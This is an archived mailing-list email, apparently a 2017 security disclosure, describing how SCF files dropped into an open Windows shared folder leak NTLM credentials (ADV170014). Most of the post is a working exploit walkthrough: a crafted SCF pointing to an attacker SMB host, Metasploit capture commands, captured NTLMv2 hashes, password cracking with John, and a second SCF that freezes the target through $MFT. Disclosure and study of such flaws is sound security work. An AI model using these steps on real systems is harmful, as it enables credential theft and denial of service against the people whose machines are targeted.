X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5617" "Monday" "23" "October" "2017" "16:47:46" "-0700" "Juan Diego" "diego@linux.com" "<CAHzAkRGAjfBh6-GgW4-gotZGSBQ4=K+xUmYegbs+-X-k8-za5w@mail.gmail.com>" "185" "[oss-security] Hash thief on Windows shared folder with SCF files. ADV170014 NTLM SSO" nil nil nil "10" "2017102323:47:46" "[oss-security] Hash thief on Windows shared folder with SCF files. ADV170014 NTLM SSO" (number mark "U       diego@linux. Oct 23  185/5617  " thread-indent "\"[oss-security] Hash thief on Windows shared folder with SCF files. ADV170014 NTLM SSO\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 30249 invoked by uid 550); 24 Oct 2017 11:36:20 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 9385 invoked from network); 23 Oct 2017 23:48:38 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:sender:from:date:message-id:subject:to;
        bh=2CDIOENCw2k31/oFIAa/oMhC42dLfp8A0xpvQ6jWHNg=;
        b=aotPVAVtdcZHOJ0AQkbQR9RxFpA0GM21QW5orMvXUpaEZwNZSiLKmyJ91e8jNldClL
         hmnZuQ8CbjrY1t4mn9cpxJ4Y9mHl62X7Jqf2S2GXhpsPkjbKwbeYcrBHYWXMCGe60Hng
         Pbe14/9aV4EWb5PlpJ8hO2qTtNRqKGWUHDEctnr8piAEcUKvnjLNXjvPkYJh60Heo6yG
         mrcWCdCtoPhOefyio4xoKsLEgU8inp7TgidZaBvExPmJbrE1PVPDfWLCk+O0EVy1UBmC
         rZWPlvWWzbrr6tzh3VOcx2t6Dboh+FkW/nxflHWagVti46lyPcbcI9G0tgAvauemM8vW
         Tlug==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:sender:from:date:message-id:subject
         :to;
        bh=2CDIOENCw2k31/oFIAa/oMhC42dLfp8A0xpvQ6jWHNg=;
        b=mtkjqUCnmw6lE1jUEFQyJVI5htmPHGKh3WYpAYmu+nr7Hp4zoMVPet/sBZEjJFeJSY
         YrMzlQcvL2rOKJJXbbvS+fzu/A3XWWmMqV9lSbeQUjr1R7hEaKVg0zLhkT4wthOA6fsh
         /Uty7Wfp0CZ5fjT2jVD9pnZqEspPXHVjnmSetIbvMVHCqxm+eL3hPWKXf9YMDdJdSPM7
         Cagb0RRxxKhxbDprD3NPNVbcOLU2RQvCTHUHMH/HgBJFAvNf6TKVahkXe7mH1EG1Biiz
         GWGbiqleFdsU+jOaWgJ3sTCFFbibZJ429K11HdpHaKsTL+bKRVTd6GUmZUDh8wNBFIjV
         VlrA==
X-Gm-Message-State: AMCzsaUHncQCcPJrbI4m3aOZCMxtiwC0lOHKShv1ejAq/9xjFgniiSe5
	pEDxPJgc7u1u+zJb0a0F9va76Oouliqm/9v1lHs=
X-Google-Smtp-Source: ABhQp+SLXmsArMFvB1W63Sf1w913mLFaf3tLex5n874ht/5QvI4Tr46CmbKEcuhbOKJAjdr0347nyEIZnO1bNCLyIsY=
X-Received: by 10.223.173.165 with SMTP id w34mr12849686wrc.22.1508802507346;
 Mon, 23 Oct 2017 16:48:27 -0700 (PDT)
MIME-Version: 1.0
Sender: diego.juan@gmail.com
From: Juan Diego <diego@linux.com>
Date: Mon, 23 Oct 2017 16:47:46 -0700
X-Google-Sender-Auth: IPw7fcxKr7B3fPWTnf2hNeOtgkQ
Message-ID: <CAHzAkRGAjfBh6-GgW4-gotZGSBQ4=K+xUmYegbs+-X-k8-za5w@mail.gmail.com>
To: fulldisclosure@seclists.org, oss-security@lists.openwall.com, 
	bugtraq@securityfocus.com
Content-Type: multipart/alternative; boundary="f403045cf3c67c9776055c3f750d"
Subject: [oss-security] Hash thief on Windows shared folder with SCF files. ADV170014 NTLM SSO

--f403045cf3c67c9776055c3f750d
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hello,

I want to share some information with the people on the list.
On May 24, I found a problem with NTLM auth on Windows.

Under certain circumstances a shared folder on Windows can be abused
remotely to obtain the user credentials and to freeze the machine.

This was already reported to MSRC on May 24, and was closed on October 18.

This attack makes use of SCF files, and a shared folder with certain
configuration.

-Create a folder anywhere on the system, example on the Desktop
-Right click - Properties
-Sharing tab
-Network and Sharing center
-Enable 'Turn off password protected sharing'

Now, you need a crafted SCF file to abuse this, the file looks like this

root@sysadminjd:~# cat test.scf
[Shell]
Command=3D2
IconFile=3D\\192.168.1.111\share\test.ico
[Taskbar]
Command=3DToggleDesktop

root@sysadminjd:~#

We are going to upload this file to the newly shared folder, we'll use
smbclient, but first we need a metasploit console running capture/smb
auxiliary module.

root@sysadminjd:~# msfconsole -q

msf > use auxiliary/server/capture/smb
msf auxiliary(smb) > set JOHNPWFILE /tmp/smbhash.txt
JOHNPWFILE =3D /tmp/smbhash.txt
msf auxiliary(smb) > exploit -j
[*] Auxiliary module running as background job

[*] Server started.
msf auxiliary(smb)


Now we can upload the file

root@sysadminjd:~# smbclient //192.168.1.67/Users
WARNING: The "syslog" option is deprecated
Enter root's password:
OS=3D[Windows 7 Ultimate 7601 Service Pack 1] Server=3D[Windows 7 Ultimate =
6.1]
smb: \> cd juan
smb: \juan\> cd Desktop\
smb: \juan\Desktop\> cd prueba2\
smb: \juan\Desktop\prueba2\> put test.scf
putting file test.scf as \juan\Desktop\prueba2\test.scf (88.9 kb/s)
(average 88.9 kb/s)
smb: \juan\Desktop\prueba2\> ls
. D 0 Mon Oct 23 12:27:15 2017
.. D 0 Mon Oct 23 12:27:15 2017
.DS_Store AH 6148 Tue May 23 17:29:03 2017
test.scf A 91 Mon Oct 23 12:27:15 2017

6527487 blocks of size 4096. 4043523 blocks available
smb: \juan\Desktop\prueba2\>
root@sysadminjd:~#

Our metasploit console should look like this

msf auxiliary(smb) >
[*] SMB Captured - 2017-10-23 12:27:15 -0400
NTLMv2 Response Captured from 192.168.1.67:49163 - 192.168.1.67
USER:juan DOMAIN:juan-PC OS: LM:
LMHASH:Disabled
LM_CLIENT_CHALLENGE:Disabled
NTHASH:47894338d99abe2f08e2c693618c7323
NT_CLIENT_CHALLENGE:0101000000000000d0046aca1b4cd301d755c3756d5639d80000000=
0020000000000000000000000
[*] SMB Captured - 2017-10-23 12:27:15 -0400
NTLMv2 Response Captured from 192.168.1.67:49163 - 192.168.1.67
USER:juan DOMAIN:juan-PC OS: LM:
LMHASH:Disabled
LM_CLIENT_CHALLENGE:Disabled
NTHASH:e97b70559f29462e2ca221d31113b9ca
NT_CLIENT_CHALLENGE:0101000000000000a0177dca1b4cd301f59d5c5d52708e3b0000000=
0020000000000000000000000
[*] SMB Captured - 2017-10-23 12:27:15 -0400
NTLMv2 Response Captured from 192.168.1.67:49163 - 192.168.1.67
USER:juan DOMAIN:juan-PC OS: LM:
LMHASH:Disabled
LM_CLIENT_CHALLENGE:Disabled
NTHASH:eb8b228b739cc95a12d7e0d89d89e002
NT_CLIENT_CHALLENGE:0101000000000000620389ca1b4cd3017283fc96884767b70000000=
0020000000000000000000000
[*] SMB Captured - 2017-10-23 12:37:09 -0400
NTLMv2 Response Captured from 192.168.1.67:49164 - 192.168.1.67
USER:juan DOMAIN:juan-PC OS: LM:
LMHASH:Disabled
LM_CLIENT_CHALLENGE:Disabled
NTHASH:4abb0803c4afd1509bfca3bbc566ad70
NT_CLIENT_CHALLENGE:010100000000000076d7742c1d4cd30161b2c77a54bd58fe0000000=
0020000000000000000000000
[*] SMB Captured - 2017-10-23 12:37:09 -0400
NTLMv2 Response Captured from 192.168.1.67:49164 - 192.168.1.67
USER:juan DOMAIN:juan-PC OS: LM:
LMHASH:Disabled
LM_CLIENT_CHALLENGE:Disabled
NTHASH:5eeb82aab85e9663624aaf6500e4d8f8
NT_CLIENT_CHALLENGE:010100000000000046ea872c1d4cd301c7a724adf323918c0000000=
0020000000000000000000000

I chopped this one to avoid sending too much to the list.

When we started the smb capture module, we passed the option

msf auxiliary(smb) > set JOHNPWFILE /tmp/smbhash.txt

So our hashes are on /tmp/smbhash.txt

Let's try with John

root@sysadminjd:~# cd /tmp/
root@sysadminjd:/tmp# john smbhash.txt_netntlmv2
Using default input encoding: UTF-8
Rules/masks using ISO-8859-1
Loaded 6 password hashes with 6 different salts (netntlmv2, NTLMv2 C/R [MD4
HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
abc (juan)
abc (juan)
abc (juan)
abc (juan)
abc (juan)
abc (juan)
6g 0:00:00:00 DONE 2/3 (2017-10-23 12:27) 75.86g/s 404596p/s 585124c/s
585124C/s abc
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@sysadminjd:/tmp#

That's it, now we have the plain text password for the machine.

If we want to freeze the machine, we can attack via $MFT with a SCF file
like this

root@sysadminjd:~# cat mft.scf
[Shell]
Command=3D2
IconFile=3D c:\$MFT\123
[Taskbar]
Command=3DToggleDesktop
root@sysadminjd:~#

Just upload it to the vulnerable folder, and the machine will freeze in a
few minutes due to $MFT NTFS issue.

Accordingly to MS, all Windows versions are affected, they released an
advisory for this:
https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/ADV17001=
4#ID0EGB

It's a partial patch, there are no real fix for this, and the regcode
change proposed by MS is only for Windows 10 and Server 2016.

I have a better-explained post about this on my blog

English: http://www.sysadminjd.com/adv170014-ntlm-sso-exploitation-guide/
Spanish: https://www.sysadminjd.com/adv170014-ntlm-sso-guia-de-explotacion/

thanks for your time :)

Best Regards


Juan Diego
--------
=E1=90=A7

--f403045cf3c67c9776055c3f750d--
